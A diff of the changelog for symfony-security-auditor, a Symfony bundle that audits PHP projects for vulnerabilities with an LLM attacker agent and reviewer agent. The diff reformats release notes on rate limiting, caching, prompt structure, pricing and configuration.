+- `audit:run --dry-run` reports the cost per role, with the attacker model and the reviewer model priced separately; `AuditCost` exposes it through `byRole()` and `by_role` in the JSON report ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
+- `audit.rate_limit.requests_per_minute`, `audit.rate_limit.input_tokens_per_minute` and `audit.rate_limit.output_tokens_per_minute` (each `int|null`, default `null`) make the audit wait ahead of time to stay inside the provider's per-minute quota; when all three are `null` the previous retry-only behaviour is unchanged, and `RateLimiterInterface` is the port for a custom limiter ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
+- A provider's `Retry-After` hint on a `429` now drives the wait (capped at `300000` ms by default) and pauses the chunks scheduled after it, instead of letting them hit the provider all at once ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
 
-### Changed
+### Bugfixes 🐛
 
-- The attacker cache key now folds in the configured attacker model name and a
-  prompt-builder version constant (`AttackerPromptBuilder::PROMPT_VERSION`).
-  Switching models or bumping the prompt automatically invalidates
-  previously-cached LLM responses; identical configuration across instances
-  still hits the cache as before.
-- `composer audit` results are now persisted to disk across runs, keyed by a
-  SHA-256 of the project's `composer.lock`. Re-running the audit (CI, repeated
-  `--dry-run`) reuses the cached advisory data instead of spawning composer
-  again. Projects without a lockfile transparently fall back to running the
-  underlying audit on every call; cache I/O failures are logged and swallowed.
-- `SymfonyAiLLMClient::invokeWithRetry()` now eagerly resolves the
-  `Symfony\AI\Platform\Result\DeferredResult` returned by `platform->invoke()`
-  before exiting the retry block. Previously the wrapped HTTP body was read
-  lazily by `asText()` / `getResult()` in `complete()` / `completeWithTools()`,
-  so transient failures emitted by `symfony/http-client`'s deferred body read
-  escaped the retry classifier — most visibly, `HTTP 429` responses bypassed the
-  rate-limit-specific backoff. Eager resolution surfaces those failures inside
-  the retry loop so backoff, retry-after hints, and budget enforcement all
-  behave as documented.
+- `audit:run` no longer crashes on the first chunk that draws a `429`, and rate-limited responses now go through retry and backoff, because a response body that fails while being read is retried instead of escaping the retry logic ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
 
-### Fixed
+### Performance Improvements 🚀
 
-- `audit:run` no longer crashes on the first chunk that draws a `429`. The
-  combination of eager `DeferredResult` resolution plus the new rate-limit
-  pipeline (`RateLimiterInterface`, server-hint backoff) means rate-limited
-  responses now flow through retry + pause instead of escaping as a raw
-  `\Throwable` to the agent layer.
+- `composer audit` results are cached on disk across runs, keyed by the hash of `composer.lock`, so CI re-runs and repeated `--dry-run` no longer spawn composer again; a project without a lockfile runs the audit every time ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
 
-### Tooling
+### Core 🧱
 
-- Dev dependency `phpunit/phpunit` bumped from `^11.5` to `^12.5`. PHPUnit 12
-  drops the abandoned `sebastian/code-unit` and
-  `sebastian/code-unit-reverse-lookup` transitives so `composer audit` no longer
-  reports abandoned-package warnings on a fresh install. Supported PHP range is
-  unchanged (`>=8.3`); test runner setup is otherwise compatible.
-- New runtime dependency `psr/clock` (the abstract `ClockInterface` the bucket
-  consumes). New dev dependency `symfony/clock` (provides `MockClock` for the
-  time-driven `TokenBucketRateLimiter` tests).
-- `castor.php` PHPUnit step drops the legacy `-d --min-coverage=100` PHPUnit CLI
-  flag — PHPUnit 12 no longer accepts the unknown option; coverage enforcement
-  is delegated to `robiningelbrecht/phpunit-coverage-tools` (already wired in
-  `phpunit.dist.xml`). The Infection step now passes `-d memory_limit=1G` to
-  clear the 128 MB default on the larger mutant tree.
-
-### Notes
-
-- All changes in this release are additive — existing public APIs (configuration
-  keys, `audit:run` arguments / options / exit codes, JSON and SARIF schemas,
-  Domain ports) keep their previous signatures. New optional constructor
-  parameters on `AuditCost`, `AuditContext::forProject()`,
-  `EstimateAuditCostUseCase`, `RunAuditUseCase::execute()`,
-  `FilesystemAttackerCache`, and `SymfonyAiLLMClient` all default to their
-  previous behavior.
-- `ProgressReporterInterface` and `RateLimiterInterface` are Domain ports
-  covered by the BC promise (see `docs/versioning.md`). For
-  `ProgressReporterInterface`, host implementations should expect new event
-  names to be added in `MINOR` releases (additive) but never have their payload
-  schemas changed without a `MAJOR`. `TokenBucketRateLimiter` state is
-  per-process: multi-process audits sharing one API key (parallel CI matrices)
-  still race on the provider window — out-of-process coordination (Redis/file
-  lock) can be added by implementing `RateLimiterInterface` and aliasing it in
-  `config/services.yaml`.
+- Cached attacker answers refresh once after upgrading, and switching the attacker model or the prompt version invalidates them from now on ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
+- `phpunit/phpunit` moves from `^11.5` to `^12.5` in the dev dependencies (PHP `>=8.3` unchanged), and `psr/clock` becomes a runtime dependency ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
+- The README opens with a 30-second quick start ([#15](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/15))
 
 ## [1.1.1] — 2026-05-24
 
-### Fixed
+### Core 🧱
 
-- Mutation gate now kills the `MethodCallRemoval` mutant on the
-  `logReviewDecision()` call inside the rejected-finding early-return branch of
-  `ReviewerAgent::applyReview()`. Existing tests covered the accepted /
-  severity-elevated paths but left the rejection-path debug log unasserted, so
-  removing the call escaped Infection — added a targeted unit test that
-  exercises a rejected review and asserts the `'Vulnerability reviewed'` debug
-  entry is emitted with `accepted => false`. No production code change.
+- The mutation-testing gate now covers the debug log of a rejected review, with no change to the audit itself ([#13](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/13))
 
 ## [1.1.0] — 2026-05-24
 
-### Added
+### New Features ✨
 
-- `Vulnerability::withCorrectedType()` — copy-on-write reclassification when the
-  reviewer determines the attacker mislabelled the finding's type. The original
-  `id` is preserved so downstream consumers can still correlate the corrected
-  record with its pre-correction source.
-- Reviewer prompt accepts a `corrected_type` field (nullable string) per
-  finding; `ReviewerAgent` parses it, validates against `VulnerabilityType`, and
-  applies it via `withCorrectedType()`. Invalid values are logged and ignored —
-  original type is preserved.
-- New configuration key `symfony_security_auditor.provider_json_mode` (boolean,
-  default `false`). When `true`, every LLM call carries
-  `response_format: {type: json_object}` to the underlying provider — honored by
-  OpenAI / Mistral / Ollama (provider-enforced JSON output), silently ignored by
-  Anthropic and any provider without an equivalent knob. The prompt contract
-  (_"Return ONLY the JSON array"_) remains authoritative; this is a
-  belt-and-braces opt-in for providers that support it.
-
-### Changed
-
-- Prompt builders restructured for accuracy: source files are now wrapped as
-  `<file path="…" type="…">…</file>` with each line prefixed by its line number
-  in the form `` `NNN | ` ``. The attacker prompt instructs the model to use
-  those exact line numbers for `line_start` / `line_end` instead of counting
-  manually. Skill blocks switched from `### Heading` to
-  `<skills role="…">…</skills>` form and are emitted in attack-surface priority
-  order rather than alphabetically.
-- Attacker base prompt now includes a severity rubric, a confidence rubric (with
-  a hard `< 0.6` filter threshold), a single canonical few-shot example with
-  concrete line numbers, and an explicit scope exclusion for `vendor/`,
-  `var/cache/`, `var/log/`, `.generated.*`, and `.cache.*` paths.
-- Each per-artifact skill block now lists both attack patterns to hunt and
-  patterns explicitly NOT to flag — reduces false positives from the attacker
-  agent before the reviewer ever sees them.
-- Reviewer prompts (single and batch) now share a common core-instructions block
-  to prevent drift, include the same severity rubric as the attacker, and embed
-  a Symfony-specific false-positive playbook (Doctrine `setParameter()`, default
-  CSRF, `mapped: false` form fields, hardcoded-argv `Process` invocations,
-  `_profiler` gated by `when@dev`, etc.). Batch mode no longer requires findings
-  to be returned in input order — entries are re-keyed by `id` on parse.
-
----
+- The reviewer can correct a finding's vulnerability type: its `corrected_type` answer is validated against the known types and applied through `Vulnerability::withCorrectedType()`, which keeps the original `id`, while an invalid value is logged and ignored ([#12](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/12))
+- `symfony_security_auditor.provider_json_mode` (boolean, default `false`) sends `response_format: {type: json_object}` with every LLM call; OpenAI, Mistral and Ollama enforce it, Anthropic and providers without an equivalent ignore it ([#12](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/12))
+- Source files reach the attacker as `<file path="…" type="…">` blocks with numbered lines, and the model is told to take `line_start` and `line_end` from those numbers ([#12](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/12))
+- The attacker prompt carries a severity rubric, a confidence rubric with a hard `< 0.6` filter threshold, a worked example, and excludes `vendor/`, `var/cache/`, `var/log/`, `.generated.*` and `.cache.*` paths ([#12](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/12))
+- Each attack-surface skill block lists the patterns to hunt and the patterns not to flag, and the blocks are emitted in attack-surface priority order inside `<skills role="…">` tags ([#12](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/12))
+- The single and batch reviewer prompts share one instruction block and the attacker's severity rubric, include a Symfony false-positive playbook (Doctrine `setParameter()`, default CSRF, `mapped: false` form fields, hardcoded-argv `Process` calls, `_profiler` gated by `when@dev`), and batch answers no longer need to follow the input order ([#12](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/12))
 
 ## [1.0.0] — 2026-05-24
 
-First stable release.
+### New Features ✨
 
-### Added
+- A multi-agent audit pipeline (ingestion, mapping, audit) pairs an adversarial attacker agent with a skeptical reviewer agent, for up to 3 iterations and stopping early when no new finding appears ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The LLM backend is provider-agnostic through `symfony/ai`: Anthropic, OpenAI, Azure OpenAI, Google Gemini, Google Vertex AI, AWS Bedrock, DeepSeek, Mistral, Meta Llama and Ollama work by changing only the `ai.yaml` platform configuration ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- 32 vulnerability types across 6 OWASP-aligned categories: Injection, Broken Access Control, Logic Flaws, Symfony-specific, Data Exposure and Cryptographic ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- `attacker_model` and `reviewer_model` pair a larger model for finding vulnerabilities with a faster, cheaper one for review, such as `claude-opus-4-7` with `claude-haiku-4-5-20251001` ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- `audit:run` prints the report as `console`, `json` or `sarif` (SARIF 2.1.0, for GitHub Code Scanning and GitLab Security Dashboard), and `--output` writes JSON or SARIF to a file ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- `audit:run --dry-run` estimates tokens and cost without calling the LLM, exits `0` with no findings and a filled `cost` block ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- `audit:run` exits `0` for a complete audit (SAFE, LOW, MEDIUM or HIGH), `1` for CRITICAL risk or an invalid project path, and `2` when a token or cost budget is exceeded, in which case a partial report is emitted ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- Real token usage (input, output and cached tokens) is recorded from the platform response on every LLM call, and the report carries a `cost` block with total tokens and estimated USD cost ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- `audit.budget.max_tokens` and `audit.budget.max_cost_usd` (both `null`, meaning unlimited, by default) abort the audit cleanly with exit code `2` and a partial report once a limit is exceeded ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- Every LLM call retries transient errors (HTTP 429, 5xx, network blips) with jittered exponential backoff and fails fast on non-transient ones, tuned by `audit.retry.max_attempts` (3), `audit.retry.initial_delay_ms` (500), `audit.retry.backoff_multiplier` (2.0) and `audit.retry.jitter_ratio` (0.2) ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- Credential-shaped strings (AWS, GitHub, Stripe, Slack and Google API keys, JWTs, PEM private keys, env-style assignments) are redacted from file content before it reaches any LLM provider; `scan.secret_scrubbing.enabled` is `true` by default and `scan.secret_scrubbing.additional_patterns` extends it ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The attacker investigates across files with `read_file`, `grep` and `list_files`, and `lookup_advisory` queries known advisories through `composer audit --format=json --locked`, degrading to an empty database and a `warning` log when `composer` or `composer.lock` is missing ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- `cache.enabled: true` caches attacker chunks by content hash and skips the LLM call for an identical chunk, and `cache.prompt_caching: true` sends `cache_control: ephemeral` for provider-side prompt caching (about 90% input-token discount on Anthropic, ignored elsewhere) ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The YAML configuration under `symfony_security_auditor:` covers `model`, `attacker_model`, `reviewer_model`, `scan.*` (`excluded_dirs`, `respect_gitignore`, `max_file_size_kb`, `secret_scrubbing.*`), `audit.*` (`max_iterations`, `min_confidence`, `reviewer_batch_size`, `tools_enabled`, `max_tool_iterations`, `budget.*`, `retry.*`) and `cache.*` (`enabled`, `dir`, `prompt_caching`) ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The default model is `claude-opus-4-7` and the default reviewer model is `claude-haiku-4-5-20251001`, replacing the retired `claude-opus-4-5` and `claude-haiku-4-5` ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The pricing table covers `claude-opus-4-7`, `claude-sonnet-4-6`, `claude-haiku-4-5-20251001`, `claude-opus-4-6`, `claude-opus-4-1`, `claude-opus-4`, `claude-sonnet-4`, `gpt-4.1`, `o3`, `o4-mini`, `gemini-2.0-flash` and `mistral-large`, and keeps the retired `claude-opus-4-5` and `claude-haiku-4-5` entries so existing configurations still report cost ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- Documentation ships in `docs/`: architecture, configuration, extending, CI, diagrams, FAQ and troubleshooting, plus `docs/versioning.md` with the semantic-versioning policy and the public API surface ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
 
-#### Core audit pipeline
+### Bugfixes 🐛
 
-- **Multi-agent security audit pipeline**: Ingestion → Mapping → Audit, driven
-  by an adversarial **Attacker** agent and a skeptical **Reviewer** agent (up to
-  3 iterations; stops early when no new findings emerge).
-- **Provider-agnostic LLM backend** via
-  [`symfony/ai`](https://symfony.com/doc/current/ai/index.html): works out of
-  the box with Anthropic (Claude), OpenAI, Azure OpenAI, Google Gemini, Google
-  Vertex AI, AWS Bedrock, DeepSeek, Mistral, Meta (Llama), and Ollama (local).
-  Swapping providers requires only `config/packages/ai.yaml` changes.
-- **32 vulnerability types** across 6 OWASP-aligned categories: Injection,
-  Broken Access Control, Logic Flaws, Symfony-specific, Data Exposure,
-  Cryptographic.
-- **Split-model support** — pair a larger model for attack discovery with a
-  faster, cheaper model for review (e.g. `attacker_model: claude-opus-4-7` +
-  `reviewer_model: claude-haiku-4-5-20251001`).
+- Budget exceptions are rethrown by the attacker and reviewer agents, so a budget overrun now aborts the audit and exits with code `2` ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- SARIF `tool.driver.version` is read from the installed Composer metadata instead of a hardcoded value ([#8](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/8))
+- Non-transient LLM failures (missing platform configuration, authentication errors, retired model names) abort the audit with exit code `1` and a clear message instead of producing a false-negative SAFE result ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- Anthropic Claude 4 Opus pricing is corrected from the Claude 3 Opus rate (`$15.00 / $75.00` per MTok) to `$5.00 / $25.00` per MTok input/output, so cost estimates in CI reports recalculate at the right rate ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
 
-#### `audit:run` console command
+### Core 🧱
 
-- Three output formats: `console` (human-readable), `json` (machine-readable),
-  `sarif` (SARIF 2.1.0 for GitHub Code Scanning and GitLab Security Dashboard).
-- `--output` option writes JSON or SARIF to a file path.
-- `--dry-run` flag estimates token usage and cost without invoking the LLM.
-  Exits `0` with zero findings and a populated `cost` block.
-- Exit codes: `0` audit complete (SAFE/LOW/MEDIUM/HIGH), `1` CRITICAL risk or
-  invalid project path, `2` token or cost budget exceeded (partial report
-  emitted).
+- Requires PHP `^8.3`, Symfony `^7.4 || ^8.0` and `symfony/ai-bundle` `^0.9`, and is tested on PHP 8.3 / 8.4 / 8.5 with Symfony 7.4 / 8.0 / 8.1 ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- Strict DDD layering (`Command → Application → Domain ← Infrastructure`) keeps `LLMClientInterface` as the only seam to `symfony/ai`, and the Domain ports (`LLMClientInterface`, `AttackerCacheInterface`, `ProjectFileScannerInterface`, the prompt builder interfaces and the tool classes) live in the `Audit\Domain\Port` namespace ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The bundle settings are read through typed configuration value objects instead of raw arrays ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- Every class that is not an extension point is tagged `@internal` ([#8](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/8), [#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The extension points are `LLMClientInterface`, `AdvisoryDatabaseInterface`, `AttackerPromptBuilderInterface`, `ReviewerPromptBuilderInterface`, `ProjectFileScannerInterface`, `AttackerCacheInterface`, `ToolInterface`, `PipelineInterface` and `StageInterface`, described in `docs/extending.md` ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- `AdvisoryDatabaseInterface` moves from `Audit\Infrastructure\Advisory\` to `Audit\Domain\Port\`, so a host that aliases it as a service must update the class name; `ComposerAuditAdvisoryDatabase` and `InMemoryAdvisoryDatabase` keep theirs ([#11](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/11))
+- The secret scrubber no longer relies on a temporary error handler around its regular expressions ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
+- The bundle is meant to be registered in the `dev` and `test` environments only ([#9](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/9))
 
-#### Token & cost tracking
-
-- Real token usage (input, output, cached tokens) recorded from platform
-  response metadata on every LLM call.
-- `AuditReport` carries a `cost` block: total tokens and estimated USD cost.
-- Character-based token estimator (`CharacterBasedTokenEstimator`) using
-  `mb_strlen` for correct multibyte handling on providers without token counts.
-
-#### Budget cap
-
-- Hard token and cost budget enforced via `audit.budget.max_tokens` and
-  `audit.budget.max_cost_usd`. Audit aborts cleanly with exit code `2` and emits
-  a partial report when either limit is exceeded. Both default to `null`
-  (unlimited).
-
-#### Resilience — retry with exponential backoff
-
-- Jittered exponential backoff around every LLM call. Transient errors (HTTP
-  429, 5xx, network blips) are retried; non-transient errors (auth, validation)
-  fail fast. Configurable: `audit.retry.max_attempts` (3),
-  `audit.retry.initial_delay_ms` (500), `audit.retry.backoff_multiplier` (2.0),
-  `audit.retry.jitter_ratio` (0.2).
-
-#### Security — credential scrubbing
-
-- Credential-shaped strings (AWS/GitHub/Stripe/Slack/Google API keys, JWTs, PEM
-  private keys, env-style assignments) are redacted from file content before
-  reaching any LLM provider. Enabled by default
-  (`scan.secret_scrubbing.enabled: true`); extensible via
-  `scan.secret_scrubbing.additional_patterns`.
-
-#### Attacker tools
-
-- `read_file`, `grep`, `list_files` — cross-file investigation tools.
-- `lookup_advisory` — live CVE feed via `composer audit --format=json --locked`.
-  Degrades gracefully (empty database + `warning` log) when `composer` or
-  `composer.lock` is absent.
-
-#### Caching
-
-- Content-hash filesystem cache for attacker chunks (`cache.enabled: true`);
-  skips the LLM call entirely when an identical chunk was analyzed before.
-- Provider-side prompt caching via `cache_control: ephemeral`
-  (`cache.prompt_caching: true`); honored by Anthropic (~90% input-token
-  discount), silently ignored by others.
-
-#### Bundle configuration
-
-- Typed Configuration value objects for all bundle settings (replaces raw array
-  access throughout the bundle).
-- Full YAML configuration surface under `symfony_security_auditor:`:
-  - `model` / `attacker_model` / `reviewer_model`
-  - `scan.*`: `excluded_dirs`, `respect_gitignore`, `max_file_size_kb`,
-    `secret_scrubbing.*`
-  - `audit.*`: `max_iterations`, `min_confidence`, `reviewer_batch_size`,
-    `tools_enabled`, `max_tool_iterations`, `budget.*`, `retry.*`
-  - `cache.*`: `enabled`, `dir`, `prompt_caching`
-
-#### Architecture
-
-- Strict DDD layering: `Command → Application → Domain ← Infrastructure`.
-  `LLMClientInterface` is the sole seam between Application and `symfony/ai`; no
-  agent imports any `symfony/ai` type directly.
-- Domain ports (`LLMClientInterface`, `AttackerCacheInterface`,
-  `ProjectFileScannerInterface`, `*PromptBuilderInterface`, `Tool/*`) live in
-  `src/Audit/Domain/Port/`.
-- All non-extension-point classes tagged `@internal`.
-
-#### Extension points
-
-`LLMClientInterface`, `AdvisoryDatabaseInterface`,
-`AttackerPromptBuilderInterface`, `ReviewerPromptBuilderInterface`,
-`ProjectFileScannerInterface`, `AttackerCacheInterface`, `ToolInterface`,
-`PipelineInterface`, `StageInterface`. See
-[`docs/extending.md`](docs/extending.md).
-
-#### Documentation
-
-- [`docs/architecture.md`](docs/architecture.md) — layer overview, data flow,
-  domain model, extension points.
-- [`docs/configuration.md`](docs/configuration.md) — full bundle configuration
-  reference.
-- [`docs/extending.md`](docs/extending.md) — how to plug in custom advisory
-  sources, tools, prompt builders, and pipeline stages.
-- [`docs/ci.md`](docs/ci.md) — CI pipeline documentation (PHP matrix, Infection,
-  PHPStan max).
-- [`docs/diagrams.md`](docs/diagrams.md) — architecture and data-flow diagrams.
-- [`docs/faq.md`](docs/faq.md) — cost, accuracy, model selection, privacy,
-  comparisons.
-- [`docs/troubleshooting.md`](docs/troubleshooting.md) — empty reports, LLM
-  errors, advisory issues, cache, CI failures.
-- [`docs/versioning.md`](docs/versioning.md) — semantic versioning policy and
-  public API surface.
-
-### Changed
-
-- `AdvisoryDatabaseInterface` moved from `Audit\Infrastructure\Advisory\` to
-  `Audit\Domain\Port\`. The interface is a public extension point, so its
-  canonical home is the Domain port namespace alongside `LLMClientInterface`,
-  `AttackerCacheInterface`, etc. Host applications aliasing the interface in
-  `config/services.yaml` must update the FQCN; concrete implementations
-  (`ComposerAuditAdvisoryDatabase`, `InMemoryAdvisoryDatabase`) keep their
-  existing FQCNs in `Infrastructure\`.
-- Default model updated from `claude-opus-4-5` (retired) to `claude-opus-4-7`.
-- Default reviewer model updated from `claude-haiku-4-5` (retired) to
-  `claude-haiku-4-5-20251001`.
-- **Pricing table corrected**: Anthropic Claude 4 Opus prices were set to the
-  Claude 3 Opus rate (`$15.00 / $75.00` per MTok) — corrected to the actual
-  Claude 4 Opus rate (`$5.00 / $25.00` per MTok input/output). Haiku and Sonnet
-  entries unchanged. Existing cost estimates in CI reports will recalculate at
-  the correct rate once updated.
-- Pricing table extended with additional current and legacy model entries:
-  `claude-opus-4-7`, `claude-sonnet-4-6`, `claude-haiku-4-5-20251001`,
-  `claude-opus-4-6`, `claude-opus-4-1`, `claude-opus-4` (deprecated alias),
-  `claude-sonnet-4` (deprecated alias), `gpt-4.1`, `o3`, `o4-mini`,
-  `gemini-2.0-flash`, `mistral-large`. Legacy `claude-opus-4-5` /
-  `claude-haiku-4-5` entries retained for cost reporting on existing
-  configurations.
-
-### Fixed
-
-- Budget exceptions now rethrown from `AttackerAgent` so abort propagates to the
-  pipeline and triggers exit code `2`.
-- SARIF `tool.driver.version` previously hardcoded; now resolved from installed
-  Composer metadata at runtime.
-- `RegexSecretScrubber` replaced `set_error_handler`/`try-finally` around PCRE
-  calls with a leading `@` suppressor — eliminates `UnwrapFinally`/`TrueValue`
-  mutation escapes and removes dead early-return path.
-- Non-transient LLM failures (missing platform configuration, auth errors,
-  retired model names) now abort the audit with exit code `1` and a clear error
-  message instead of silently producing a false-negative SAFE result. Introduced
-  `Audit\Domain\Exception\LLMProviderException` as the catchable Domain type;
-  `AttackerAgent` and `ReviewerAgent` rethrow it rather than swallowing it.
-
-### Compatibility
-
-| Axis                | Requirement      |
-| ------------------- | ---------------- |
-| PHP                 | `^8.3`           |
-| Symfony             | `^7.4 \|\| ^8.0` |
-| `symfony/ai-bundle` | `^0.9`           |
-
-CI test matrix: PHP 8.3 / 8.4 / 8.5 × Symfony 7.4 / 8.0 / 8.1.
-
-### Notes
-
-- Default model is `claude-opus-4-7`. Change via `model:`, `attacker_model:`, or
-  `reviewer_model:`.
-- Register bundle in `dev` and `test` environments only (per
-  `config/bundles.php` guidance in the README).
-
-[1.20.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.20.1
-[1.20.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.20.0
-[1.19.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.19.1
-[1.19.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.19.0
-[1.18.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.18.0
-[1.17.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.17.0
-[1.16.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.16.0
-[1.15.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.15.0
-[1.14.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.14.0
-[1.13.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.13.0
-[1.12.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.12.0
-[1.11.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.11.0
-[1.10.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.10.1
-[1.10.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.10.0
-[1.9.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.9.0
-[1.8.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.8.0
-[1.7.2]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.7.2
-[1.7.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.7.1
-[1.7.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.7.0
-[1.6.4]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.4
-[1.6.3]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.3
-[1.6.2]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.2
-[1.6.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.1
-[1.6.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.0
-[1.5.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.5.0
-[1.4.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.4.0
-[1.3.3]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.3
-[1.3.2]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.2
-[1.3.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.1
-[1.3.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.3.0
-[1.2.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.2.1
-[1.2.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.2.0
-[1.1.1]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.1.1
-[1.1.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.1.0
-[1.0.0]:
-  https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.0.0
+[1.22.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.22.0
+[1.21.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.21.0
+[1.20.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.20.1
+[1.20.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.20.0
+[1.19.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.19.1
+[1.19.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.19.0
+[1.18.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.18.0
+[1.17.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.17.0
+[1.16.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.16.0
+[1.15.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.15.0
+[1.14.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.14.0
+[1.13.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.13.0
+[1.12.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.12.0
+[1.11.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.11.0
+[1.10.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.10.1
+[1.10.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.10.0
+[1.9.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.9.0
+[1.8.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.8.0
+[1.7.2]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.7.2
+[1.7.1]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.7.1
+[1.7.0]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.7.0
+[1.6.4]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.4
+[1.6.3]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.3
+[1.6.2]: https://github.com/vinceAmstoutz/symfony-security-auditor/releases/tag/1.6.2
